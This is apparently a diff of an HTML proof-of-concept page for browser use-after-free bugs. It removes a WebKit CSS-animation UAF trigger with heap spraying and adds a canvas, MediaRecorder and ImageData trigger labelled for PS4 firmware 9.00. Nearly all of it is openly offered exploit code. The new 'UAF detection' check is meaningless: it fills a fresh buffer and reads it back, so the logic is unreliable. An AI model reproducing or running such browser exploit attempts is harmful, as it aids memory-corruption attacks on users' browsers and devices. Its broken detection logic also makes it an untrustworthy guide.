@@ -3,83 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BUG ---- </title>
+    <title>Canvas UAF PoC </title>
     <style>
-      @keyframes keyframes {}
-      cite { animation: keyframes 100ms; }
-      button {
-        margin-top: 20px;
-        padding: 10px;
-        font-size: 16px;
-      }
-      #status {
-        margin-top: 10px;
-        font-weight: bold;
-      }
+        #trigger {
+            margin: 20px 0;
+            padding: 12px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        #status {
+            margin-top: 10px;
+            font-weight: bold;
+            color: darkred;
+        }
+        #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <h1>WebKit CSS Animation UAF</h1>
-    <p>Click the button to trigger the PoC. (Browser may crash or show exploit messages)</p>
-    <button id="button">Trigger PoC</button>
-    <div id="status">Waiting...</div>
-    <object type="image/png">
-        <cite></cite>
-        <dl hidden></dl>
-    </object>
-    <p>PASS if this test doesn't crash</p>
-    <script type="module">
-        import { debug_log } from './module/utils.mjs';
-
-        const object = document.querySelector("object");
-        const cite = document.querySelector("cite");
-        const dl = document.querySelector("dl");
-        const status = document.getElementById("status");
-        const DELAY = 100;
+    <h1>Canvas UAF PoC (PS4 9.00)</h1>
+    <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
+    <button id="trigger">Trigger PoC</button>
+    <div id="status">Idle...</div>
+    <canvas id="canvas" width="512" height="512"></canvas>
+    <script>
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const status = document.getElementById('status');
         let attemptCount = 0;
 
-        function heapSpray() {
-          let spray = [];
-          for (let i = 0; i < 10000; i++) {
-            let arr = new Uint8Array(0x1000);
-            for (let j = 0; j < arr.length; j++) {
-              arr[j] = 0x41;
+        function stressGC() {
+            for (let i = 0; i < 300; i++) {
+                new ArrayBuffer(1024 * 1024);
             }
-            spray.push(arr);
-          }
-          return spray;
         }
 
-        function triggerUAF() {
-          attemptCount++;
-          debug_log("Attempt #" + attemptCount + ": Initiating exploit...");
-          status.textContent = "Attempt #" + attemptCount + " in progress...";
-          object.data = "x";
-          cite.style.animationIterationCount = "infinite";
-          setTimeout(() => {
-            const animation = cite.getAnimations()[0];
-            object.width = "1em";
-            object.codeBase;
-            animation.effect = new KeyframeEffect(dl, {});
-            heapSpray();
-            debug_log("UAF triggered, check for crash or memory corruption.");
-            status.textContent = "Exploit triggered!";
-          }, DELAY);
+        function drawOnCanvas() {
+            ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.beginPath();
+            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
+            ctx.fill();
         }
 
-        const observer = new MutationObserver((mutations) => {
-          debug_log("DOM tree modified, attempting UAF exploit...");
-          triggerUAF();
-        });
+        function triggerExploit() {
+            attemptCount++;
+            status.textContent = `Attempt ${attemptCount} in progress...`;
 
-        observer.observe(object, { attributes: true, childList: true, subtree: true });
-
-        document.getElementById('button').addEventListener('click', () => {
             try {
-                triggerUAF();
-            } catch (e) {
-                debug_log("Error occurred: " + e.message);
-                status.textContent = "Error: Exploit failed.";
+                // Start canvas capture stream
+                const stream = canvas.captureStream(30);
+                const options = {};
+                const recorder = new MediaRecorder(stream, options);
+
+                // Intensive drawing
+                const drawInterval = setInterval(drawOnCanvas, 10);
+
+                // Access properties to mimic test
+                const videoBits = recorder.videoBitsPerSecond || 1000000;
+                const textarea = document.createElement('textarea');
+                const cols = textarea.cols || 20;
+
+                // Stress ImageData
+                new ImageData(videoBits, cols, {});
+
+                // Check for UAF
+                setTimeout(() => {
+                    const testBuf = new Uint8Array(4096);
+                    testBuf.fill(0x46);
+                    if (testBuf[0] !== 0x46) {
+                        status.textContent = 'Early UAF detected!';
+                        clearInterval(drawInterval);
+                        recorder.stop();
+                        return;
+                    }
+                    stressGC();
+                    status.textContent = 'Exploit attempted!';
+                    clearInterval(drawInterval);
+                    recorder.stop();
+                }, 150);
+            } catch (err) {
+                console.error(`Error: ${err.message}`);
+                status.textContent = 'Failed: Error occurred.';
+            }
+        }
+
+        document.getElementById('trigger').addEventListener('click', () => {
+            try {
+                triggerExploit();
+            } catch (err) {
+                console.error(`Error: ${err.message}`);
+                status.textContent = 'Failed: Error occurred.';
             }
         });
     </script>
